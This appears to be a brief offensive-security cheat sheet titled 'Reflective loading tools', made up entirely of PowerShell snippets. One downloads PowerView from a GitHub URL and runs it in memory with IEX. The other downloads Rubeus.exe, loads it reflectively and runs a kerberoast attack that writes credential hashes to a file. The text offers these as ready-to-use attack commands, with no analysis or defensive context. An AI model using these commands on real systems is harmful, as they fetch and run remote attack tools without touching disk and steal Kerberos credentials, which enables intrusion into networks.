# Reflective loading tools

PowerView
```powershell
(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/PowerView.ps1') | IEX
```

Rubeus
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('https://raw.githubusercontent.com/wez3/reflective-loading/main/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
```
